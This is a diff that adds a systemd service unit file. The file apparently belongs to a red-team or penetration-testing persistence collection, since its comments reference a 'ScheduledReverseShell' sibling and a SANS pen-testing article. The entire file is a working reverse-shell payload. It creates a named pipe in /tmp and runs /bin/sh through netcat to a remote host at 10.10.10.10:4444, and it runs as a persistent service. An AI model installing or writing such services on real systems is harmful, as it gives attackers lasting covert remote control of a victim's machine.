@@ -1,0 +1,9 @@
+; https://www.freedesktop.org/software/systemd/man/systemd.service.html
+[Service]
+; only consider this service up if the ExecStart directive succeeds
+; (just to show some variety when compared to ScheduledReverseShell's revshell.service)
+Type=exec
+; https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
+Environment=RHOST="10.10.10.10" RPORT="4444"
+ExecStartPre=/bin/sh -c "find /tmp/backpipe || mknod --mode=0666 /tmp/backpipe p"
+ExecStart=/bin/sh -c "/bin/sh 0</tmp/backpipe | /bin/nc ${RHOST} ${RPORT} 1>/tmp/backpipe"
